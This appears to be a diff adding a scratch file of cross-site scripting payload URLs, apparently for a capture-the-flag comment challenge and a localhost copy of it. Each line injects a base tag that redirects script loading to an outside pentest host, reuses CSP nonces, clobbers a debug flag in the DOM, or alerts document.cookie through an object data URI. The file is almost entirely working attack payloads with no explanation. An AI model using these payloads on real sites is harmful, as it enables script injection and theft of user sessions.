@@ -1,0 +1,20 @@
+https://chal54-fiu36s.vercel.app/comment?comment=yo%3Cbase%20href=%22https://rtchat-pentest.onrender.com/%22%20/%3E%3Cscript%20src=%22x%22%20nonce=%27nonce-db5543e6-48b1-4a58-88d2-8f9848113a41%27%20/%3E%3Cscript%20nonce=nonce-db5543e6-48b1-4a58-88d2-8f9848113a41%20src=%22script.js%22%3E%3C/script%3E%3Cform%3E%3C/form%3E
+
+
+
+http://localhost:3000/comment?comment=<base href="https://rtchat-pentest.onrender.com" /><form><script nonce="a2b3df1c-9908-409a-adc7-33061bf56af9">window.isDebugMode=true</script><script nonce="a2b3df1c-9908-409a-adc7-33061bf56af9">alert(1)</script></form>
+
+http://localhost:3000/comment?comment=<form><base href="https://rtchat-pentest.onrender.com"><input id="isDebugMode" /></form>
+
+http://localhost:3000/comment?comment=<form><base href="https://rtchat-pentest.onrender.com"><script src="/script.js" nonce="0c174609-d545-4af8-a24b-4a15865e0647"></script></form>
+
+
+
+
+
+
+
+
+<object data="data:text/html,<script>alert(document.cookie)</script>"></object>
+
+http://localhost:3000/comment?comment=%3Cform%3E%3Cbase%20href%3D%22https%3A%2F%rtchat-pentest.onrender.com%2F%22%3E%3Cscript%20nonce%3D%22a2b3df1c-9908-409a-adc7-33061bf56af9%22%3Ewindow.isDebugMode%20%3D%20true%3Balert(document.domain)%3B%3C%2Fscript%3E%3C%2Fform%3E
